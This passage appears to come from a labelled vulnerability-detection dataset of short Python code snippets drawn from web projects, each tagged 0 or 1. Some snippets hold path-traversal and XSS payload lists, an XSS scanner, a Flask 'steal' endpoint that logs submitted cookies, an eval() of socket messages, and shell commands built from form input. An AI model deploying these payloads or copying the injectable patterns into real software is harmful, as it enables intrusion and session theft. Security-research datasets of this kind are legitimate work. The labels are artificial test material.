\tproxy=sql.get_setting('proxy') \thaproxy_dir=sql.get_setting(", "label": 0}, {"snippet_id": 29605, "code": " kwargs.get('retunr_err')==1: \t\t\treturn stderr.read().decode(encoding='UTF-8') \t\telse: \t\t\treturn stdout.read().decode(encoding='UTF-8') \t\t\t \t\tfor line in stderr.read().decode(encoding='UTF-8'): \t\t\tif line: \t", "label": 0}, {"snippet_id": 26731, "code": "%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '../../boot.ini%00', '../../../boot.ini%00', '../../..", "label": 0}, {"snippet_id": 25965, "code": ".initial=data.get('question_form_data',{}).get(key) class BaseInvoiceAddressForm(forms.ModelForm): vat_warning=False class Meta: model=InvoiceAddress fields=('is_business', 'company', 'name_parts', 'street',", "label": 0}, {"snippet_id": 25631, "code": ".admission and event.settings.attendee_emails_asked: self.fields['attendee_email']=forms.EmailField( required=event.settings.attendee_emails_required, label=_('Attendee email'), initial=(cartpos.attendee_email", "label": 0}, {"snippet_id": 48752, "code": ": aid: ArticleRequested=ArticleRequested.objects.get(id=int(request.GET[\"id\"])) r: GroupReservation=GroupReservation.objects.get(id=int(request.GET[\"rid\"])) if(aid.RID.createdByUser==u or u.rights > 1)", "label": 0}, {"snippet_id": 36215, "code": " default_fields: \t\t\tfrom frappe.model.meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance(val,(int, float)): \t", "label": 0}, {"snippet_id": 24789, "code": "\"./manage.py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers", "label": 0}, {"snippet_id": 34526, "code": " table of \"{1}\" must be a dict or BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself.name, str(type(value))[1:-1], value) \t\t\t) \tdef extend(self, key, value): \t\tif isinstance(value, list): \t\t\tfor v in value:", "label": 0}, {"snippet_id": 18468, "code": ".views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 48204, "code": ") def action_add_multiple_media(request: HttpRequest): try: category: str=request.POST[\"category\"] files=request.FILES.getlist('files') user: Profile=get_current_user(request) for f in files: handle_file", "label": 0}, {"snippet_id": 17611, "code": ".views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student", "label": 0}, {"snippet_id": 5611, "code": "'<<script>alert(\"xss\");//<</script>', \"\"\"<img src=\"javascript:alert('xss')\" \"\"\", '<a href=\"javascript%26colon;alert(1)\">click', '<a href=javas& '<--`<img/src=` onerror=confirm``> --!>', '\\'\"</Script><Html", "label": 0}, {"snippet_id": 43369, "code": " not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value and not(\"<script", "label": 0}, {"snippet_id": 26663, "code": "./../../../boot.ini', '../../../../../../boot.ini', '../../../../../../../boot.ini', '../../../../../../../../boot.ini', '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e", "label": 0}, {"snippet_id": 30984, "code": "(\"/bin/rm -f \" +cfg)\t \t\t if form.getvalue('master'): \tmaster=form.getvalue('master') \tslave=form.getvalue('slave') \tinterface=form.getvalue('interface') \tvrrpip=form.getvalue('vrrpip') \ttmp_config_path", "label": 0}, {"snippet_id": 11261, "code": "-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir:", "label": 0}, {"snippet_id": 27681, "code": "']=bool(helpers.get_user_email()) values['ga_tracking_id']=( local_config.GAEConfig().get('ga_tracking_id') if not auth.is_current_user_admin() else None) if values['is_logged_in']: values['switch_account_url", "label": 0}, {"snippet_id": 28741, "code": " \t\t \tif not is_admin(level=give_level): \t\tprint('<center><h3 style=\"color: red\">How did you get here?! O_o You do not have need permissions</h>') \t\tprint('<meta http-equiv=\"refresh\" content=\"5; url=/\">", "label": 1}, {"snippet_id": 3055, "code": " payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list", "label": 0}, {"snippet_id": 47558, "code": ".number_of_allowed_reservations), minimum=0)) f.add_content(PlainText(\"Rights: \")) f.add_content(NumberField(name=\"rights\", button_text=str(profile.rights), minimum=0, maximum=4)) f.add_content(PlainText", "label": 0}, {"snippet_id": 27585, "code": " response for 403.\"\"\" login_url=make_login_url(dest_url=self.request.url) user_email=helpers.get_user_email() if not user_email: self.redirect(login_url) return contact_string=db_config.get_value('contact_string", "label": 0}, {"snippet_id": 586, "code": "', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url", "label": 0}, {"snippet_id": 51227, "code": "') actions=[] @staticmethod def in_groups(obj): value=\"\" for group in obj.groups.all(): value +=group.name return value class GroupAdmin(BaseGroupAdmin, ImportExportModelAdmin): resource_class=GroupResource", "label": 0}, {"snippet_id": 33236, "code": "(gae_users.create_login_url(self.request.url)) self.response.write('build %d not found' % build_id) self.abort(404) return self.redirect(str(build.url)) class TaskCancelSwarmingTask(webapp2.RequestHandler)", "label": 1}, {"snippet_id": 51906, "code": "='pickle' CELERY_TIMEZONE='UTC' CELERY_BEAT_SCHEDULER='django_celery_beat.schedulers:DatabaseScheduler' CELERY_BROKER_CONNECTION_MAX_RETRIES=1 CELERY_BROKER_CONNECTION_RETRY=False CELERY_RESULT_EXPIRES", "label": 0}, {"snippet_id": 10306, "code": " else '' ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"", "label": 0}, {"snippet_id": 30491, "code": "] \t\tsyslog_server=sql.get_setting('syslog_server') \t \tif waf==\"1\": \t\tlocal_path_logs='/var/log/modsec_audit.log' \t\tcommands=[ \"sudo cat %s |tail -%s %s %s\" %(local_path_logs, rows, grep_act, grep)]\t \t\t", "label": 0}, {"snippet_id": 6048, "code": "'fticks_secret_key': None, 'fticks_format_string': 'F-TICKS/SWAMID/2.0 'static_dir': None, 'ssl_adapter': 'builtin', 'server_cert': None, 'server_key': None, 'cert_chain': None, 'userdb_mongo_uri': None", "label": 0}, {"snippet_id": 9225, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+", "label": 1}, {"snippet_id": 49917, "code": " might be located on http://localhost:4001/, whereas the webclient can be found on http://localhost:4001/webclient.) /webclient -this url is handled through django's template system and serves the html", "label": 0}, {"snippet_id": 5118, "code": "\"\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @classmethod def alterTest(cls, p=False): return \"<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s='' for t in cls", "label": 0}, {"snippet_id": 42857, "code": "\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self", "label": 0}, {"snippet_id": 5931, "code": "(self, payload): return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src,", "label": 0}, {"snippet_id": 49073, "code": ", \"\").split(\".\")] if self.query_order else[] self.current_columns_length=len(self.current_columns) @property def priority(self): if self.is_ordered(): return self.current_columns.index(self.column_id) ", "label": 0}, {"snippet_id": 41323, "code": " as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category", "label": 0}, {"snippet_id": 13139, "code": ".views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student", "label": 0}, {"snippet_id": 23487, "code": "'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login", "label": 0}, {"snippet_id": 11298, "code": ".pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff", "label": 0}, {"snippet_id": 52554, "code": " _property in properties])) if copied_properties: _properties.update(copied_properties) response['status']=0 response['properties']=_properties response['name']='%s-%s' %(node['widgetType'].split('-')[0], node[", "label": 0}, {"snippet_id": 53687, "code": " properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting bundle %s\") %(bundle,), detail=ex._headers.get('oozie-error-message', ex", "label": 0}, {"snippet_id": 1010, "code": ".urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload", "label": 0}, {"snippet_id": 13075, "code": "(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change", "label": 0}, {"snippet_id": 28599, "code": " telegrams: \t\ttoken_bot=telegram[1] \t\tchannel_name=telegram[2] \t\t\t \tif proxy is not None: \t\tapihelper.proxy={'https': proxy} \ttry: \t\tbot=telebot.TeleBot(token=token_bot) \t\tbot.send_message(chat_id=channel_name,", "label": 0}, {"snippet_id": 45235, "code": ".user)) }) def new_coordinator(request): return edit_coordinator(request) @check_document_modify_permission() def save_coordinator(request): response={'status': -1} coordinator_data=json.loads(request.POST", "label": 0}, {"snippet_id": 2195, "code": ") result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[", "label": 0}, {"snippet_id": 33533, "code": "(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t", "label": 0}, {"snippet_id": 1487, "code": " pymongo import MongoClient from utils.vulnerabilities import alerts app=Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static') client=MongoClient('localhost',27017", "label": 0}, {"snippet_id": 33991, "code": "'Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc,", "label": 0}, {"snippet_id": 14814, "code": " self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir)", "label": 0}, {"snippet_id": 7455, "code": "'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 10805, "code": ".get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None)", "label": 0}, {"snippet_id": 1917, "code": ".body) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request", "label": 1}, {"snippet_id": 35029, "code": "\t\t\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: ", "label": 0}, {"snippet_id": 34093, "code": " from six import iteritems, string_types import datetime import frappe, sys from frappe import _ from frappe.utils import(cint, flt, now, cstr, strip_html, \tsanitize_html, sanitize_email, cast_fieldtype", "label": 0}, {"snippet_id": 11587, "code": "'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]", "label": 0}, {"snippet_id": 52429, "code": "']=workflow_doc.id response['doc1_id']=workflow_doc.doc.get().id response['message']=_('Page saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def new_node(request): response", "label": 0}, {"snippet_id": 40616, "code": "\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2", "label": 0}, {"snippet_id": 25320, "code": "=final_attrs.get('id', None) for i, widget in enumerate(self.widgets): try: widget_value=value[i] except(IndexError, TypeError): widget_value=None if id_: final_attrs=dict( final_attrs, id='%s_%s' %(id_", "label": 0}, {"snippet_id": 37425, "code": ".blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}]", "label": 0}, {"snippet_id": 17955, "code": "'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP", "label": 0}, {"snippet_id": 52465, "code": "']=='subworkflow-widget': workflows=_get_workflows(request.user) response['status']=0 response['properties']=properties response['workflows']=workflows return HttpResponse(json.dumps(response), mimetype", "label": 0}, {"snippet_id": 32024, "code": " from django.utils.translation import ugettext_lazy as _ from django.utils.translation import ungettext_lazy from horizon import tables from openstack_dashboard import api class CreateMappingLink(tables", "label": 0}, {"snippet_id": 11984, "code": " urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>", "label": 0}, {"snippet_id": 33889, "code": " get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by", "label": 0}, {"snippet_id": 12978, "code": " settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), )", "label": 0}, {"snippet_id": 23554, "code": ".view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status", "label": 0}, {"snippet_id": 45402, "code": ", coordinator, mapping) request.info(_('Coordinator submitted.')) return redirect(reverse('oozie:list_oozie_coordinator', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form: %s'", "label": 0}, {"snippet_id": 15434, "code": ".wait_for_test_servers() try: CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install() print 'Forums permissions/roles data has been seeded' except FixtureError: pass if self.serversonly: self", "label": 0}, {"snippet_id": 4577, "code": "'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'head', 'header', 'hgroup", "label": 0}, {"snippet_id": 27571, "code": "\"\"Return true if the request is from a cron job.\"\"\" return bool(self.request.headers.get('X-Appengine-Cron')) def render_forbidden(self, message): \"\"\"Write HTML response for 403.\"\"\" login_url=make_login_url", "label": 0}, {"snippet_id": 31576, "code": "\t\t \t\toutput_file(\"templates/metrics_waf_out.html\", mode='inline') \t\t \t\tx_min=df.index.min() -pd.Timedelta(hours=1) \t\tx_max=df.index.max() +pd.Timedelta(minutes=1) \t\tp[serv]=figure( \t\t\ttools=\"pan,box_zoom", "label": 0}, {"snippet_id": 51432, "code": ".dirname(__file__)) SECRET_KEY='_dzlo^9d DEBUG=True ALLOWED_HOSTS=[] INSTALLED_APPS=[ 'constance', 'constance.backends.database', 'jet.dashboard', 'jet', 'import_export', 'django.contrib.admin', 'django", "label": 0}, {"snippet_id": 37234, "code": "(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') ", "label": 0}, {"snippet_id": 53982, "code": "/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n-", "label": 0}, {"snippet_id": 41429, "code": ", t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand", "label": 0}, {"snippet_id": 43724, "code": "\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"", "label": 0}, {"snippet_id": 29352, "code": " \t\telse: \t\t\tcommands=[ \"sudo haproxy -q -c -f \" +tmp_file +\"&& sudo mv -f \" +tmp_file +\" \" +sql.get_setting('haproxy_config_path') +\" && sudo \" +sql.get_setting('restart_command')]\t \t\tif sql.get_setting", "label": 0}, {"snippet_id": 53871, "code": "']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n-------------------------", "label": 0}, {"snippet_id": 6443, "code": " self.config.get(self.section, 'cert_chain') @property def userdb_mongo_uri(self): \"\"\" UserDB MongoDB connection URI(string). See MongoDB documentation for details. \"\"\" return self.config.get(self.section", "label": 0}, {"snippet_id": 54700, "code": ".toc', ]) return context def post(self, request, *args, **kwargs): self.object=self.get_object() form=self.get_form() if form.is_valid(): return self.form_valid(form) else: return self.form_invalid(form", "label": 0}, {"snippet_id": 17212, "code": ".news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>", "label": 0}, {"snippet_id": 42218, "code": "\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields: \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self", "label": 0}, {"snippet_id": 2765, "code": ".urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload", "label": 0}, {"snippet_id": 20419, "code": "/github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params)", "label": 0}, {"snippet_id": 5434, "code": "'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onoffline', 'ononline', 'onorientationchange', 'onpagehide', 'onpageshow', 'onpaste', 'onpause', 'onplay', 'onplaying', 'onpopstate", "label": 0}, {"snippet_id": 38885, "code": "\t\t\t) \tdef extend(self, key, value): \t\tif isinstance(value, list): \t\t\tfor v in value: \t\t\t\tself.append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) ", "label": 0}, {"snippet_id": 12512, "code": "+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort", "label": 0}, {"snippet_id": 31050, "code": ".upload(slave, tmp_config_path, script) \tfunct.ssh_command(master,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip]) \tfunct.ssh_command(slave,[\"sudo chmod", "label": 0}, {"snippet_id": 14115, "code": "'open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 0}, {"snippet_id": 28202, "code": "\"r\") \t\tconfig_read=conf.read() \t\tconf.close \texcept IOError: \t\terror +='<br />Can\\'t read import config file' \tos.system(\"/bin/mv %s %s.old\" %(cfg, cfg))\t if serv is not None and form.getvalue('config'", "label": 0}, {"snippet_id": 23568, "code": " include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name=", "label": 0}, {"snippet_id": 20972, "code": ")$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$", "label": 0}, {"snippet_id": 36514, "code": "(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval,(tuple, list)): \t\t\t\tif fval is True:", "label": 0}, {"snippet_id": 894, "code": ": impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url,method,headers,body,scanid=None): xss_result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D']", "label": 1}, {"snippet_id": 7588, "code": "/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index", "label": 1}, {"snippet_id": 32611, "code": " elif path.lower().endswith('.jpg'): self._DoImage(full_path, 'image/jpeg') elif os.path.isdir(full_path): self._DoDirListing(full_path) elif os.path.exists(full_path): self._DoRawSourceFile(full_path)", "label": 0}, {"snippet_id": 21248, "code": ", 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]", "label": 1}, {"snippet_id": 15014, "code": "() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls): \"\"\" Returns the expected command", "label": 0}, {"snippet_id": 30228, "code": " dump \t \thaproxy_user=sql.get_setting('stats_user') \thaproxy_pass=sql.get_setting('stats_password') \tstats_port=sql.get_setting('stats_port') \tstats_page=sql.get_setting('stats_page') \t \tpostdata={ \t\t'action", "label": 0}, {"snippet_id": 900, "code": "() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse", "label": 0}, {"snippet_id": 52857, "code": " try: submission=Submission(user, workflow, fs, jt, mapping) job_id=submission.run() return job_id except RestException, ex: detail=ex._headers.get('oozie-error-message', ex) if 'Max retries exceeded with", "label": 0}, {"snippet_id": 41052, "code": ".published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext", "label": 0}, {"snippet_id": 14895, "code": " expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self", "label": 0}, {"snippet_id": 47938, "code": ".save() user: Profile=Profile() user.rights=rights user.number_of_allowed_reservations=int(request.POST[\"allowed_reservations\"]) user.displayName=displayname user.authuser=auth_user user.dect=dect user", "label": 0}, {"snippet_id": 40321, "code": "\t\t\t\tor df.get(\"fieldtype\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1 and not df.get(\"allow_on_submit\"))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html", "label": 1}, {"snippet_id": 49798, "code": "('sendMSG','Connection Established.') `,1000) } catch{} socket.on('getMSG',function(data){ document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black>[\"+data+\"]</font>\"; try{ output=eval", "label": 1}, {"snippet_id": 31510, "code": " \timport http.cookies \t\t \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t \tservers=sql.select_waf_servers_metrics(user_id.value) \tservers=sorted(servers) \t ", "label": 0}, {"snippet_id": 18023, "code": ".urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url", "label": 0}, {"snippet_id": 23532, "code": ".migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS", "label": 0}, {"snippet_id": 31798, "code": ":0\">Cat\\'n create new '+form.getvalue('color')+' list. %s </div>' % e) \t\t if form.getvalue('bwlists_save'): \tlist=os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group'", "label": 0}, {"snippet_id": 14651, "code": "): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual", "label": 0}, {"snippet_id": 34662, "code": " \t\t\tif df: \t\t\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else", "label": 0}, {"snippet_id": 11590, "code": ", url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user", "label": 0}, {"snippet_id": 10882, "code": ", '1117', 'seed_forum', 'seed_foo').install() print 'Forums permissions/roles data has been seeded' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type", "label": 0}, {"snippet_id": 23270, "code": "'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 43154, "code": " !=value: \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0}\").format(self.meta.get_label(fieldname)), \t\t\t\t\tfrappe.CannotChangeConstantError) \tdef _validate_length(self): \t\tif frappe.flags.in_install: ", "label": 0}, {"snippet_id": 12535, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/", "label": 0}, {"snippet_id": 2844, "code": " api_logger.W) attack_result={ \"id\": 11, 